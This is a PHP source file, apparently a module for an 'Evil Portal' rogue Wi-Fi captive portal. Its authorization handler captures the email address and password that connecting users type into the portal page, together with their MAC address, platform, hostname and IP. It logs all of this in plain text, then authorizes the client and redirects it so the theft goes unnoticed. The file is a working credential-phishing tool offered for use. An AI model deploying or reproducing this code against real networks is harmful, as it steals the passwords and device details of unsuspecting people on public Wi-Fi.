<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        // Check if destination is set in the request
        $target = $this->request->destination;

        // Log the form data
        if (isset($this->request->email) && isset($this->request->password)) {
            $email = $this->request->email;
            $password = $this->request->password;
            $mac = $this->request->mac ?? 'Unknown';
            $platform = $this->request->platform ?? 'Unknown';
            $hostname = $this->request->hostname ?? 'Unknown';
            $ip = $this->request->ip ?? $_SERVER['REMOTE_ADDR'];

            // Log all form data one per line
            $this->writeLog("Captured credentials for client IP: {$ip}");
            $this->writeLog("Email: {$email}");
            $this->writeLog("Password: {$password}");
            $this->writeLog("MAC Address: {$mac}");
            $this->writeLog("Platform: {$platform}");
            $this->writeLog("Hostname: {$hostname}");
            $this->writeLog("Client IP: {$ip}");
        }

        // If the client is authorized, redirect to the destination
        if ($this->isClientAuthorized($_SERVER['REMOTE_ADDR'])) {
            $this->writeLog("Client {$_SERVER['REMOTE_ADDR']} already authorized. Redirecting to {$target}");
            $this->redirect($target);
        } else {
            // If not authorized, authorize the client
            $this->authorizeClient($_SERVER['REMOTE_ADDR']);
            $this->writeLog("Client {$_SERVER['REMOTE_ADDR']} authorized. Redirecting to {$target}");

            // Call onSuccess to handle any further actions upon successful authorization
            $this->onSuccess();

            // Redirect to the target URL
            $this->redirect($target);
        }
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI and logs the success.
     */

    public function onSuccess()
    {
        // Log success using parent method
        $this->writeLog("User successfully authorized: " . $_SERVER['REMOTE_ADDR']);
        
        // Call the parent onSuccess() method to preserve default success behavior
        parent::onSuccess();
    }

    /**
     * If an error occurs, do something here.
     * Override to provide your own functionality.
     */

    public function showError()
    {
        // Log failure using parent method
        $this->writeLog("Authorization failed for: " . $_SERVER['REMOTE_ADDR']);
        
        // Call the parent showError() method to preserve default error behavior
        parent::showError();
    }

    /**
     * Redirect to a specified URL.
     * Override this to customize the redirection process if needed.
     */

    protected function redirect($url)
    {
        // Perform the actual redirection
        header("Location: {$url}", true, 302);
        exit();  // Ensure no further code is executed after redirection
    }
}